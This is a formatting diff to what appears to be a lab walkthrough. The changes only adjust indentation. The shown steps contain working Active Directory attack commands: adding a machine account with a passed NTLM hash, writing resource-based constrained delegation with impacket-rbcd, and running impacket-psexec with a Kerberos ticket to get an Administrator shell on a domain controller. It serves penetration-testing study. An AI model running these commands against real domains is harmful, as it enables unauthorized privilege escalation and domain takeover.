@@ -37,14 +37,14 @@
    impacket-addcomputer resourced.local/l.livingstone -dc-ip 192.168.210.175 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'newpc' -computer-pass 'newpc''
    ```
 
-   7. assign Resource-Based Constrained Delegation (RBCD)
+7. assign Resource-Based Constrained Delegation (RBCD)
       ```
       impacket-rbcd -dc-ip 192.168.210.175 -delegate-from newpc$ -delegate-to RESOURCEDC$ -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -action write resourced.local/l.livingstone
    ```
 
-   8. set correct FQDN for Kerberos TGS & SPN --> /etc/hosts  192.168.210.175 resourcedc.resourced.local
+8. set correct FQDN for Kerberos TGS & SPN --> /etc/hosts  192.168.210.175 resourcedc.resourced.local
 
-   9. impacket-psexec, via Kerberos ticket（ccache）, get shell as Administrator
+9. impacket-psexec, via Kerberos ticket（ccache）, get shell as Administrator
    ```
    sudo KRB5CCNAME=Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache impacket-psexec -k -no-pass resourced.local/Administrator@resourcedc.resourced.local -dc-ip 192.168.210.175
-```
+  ```
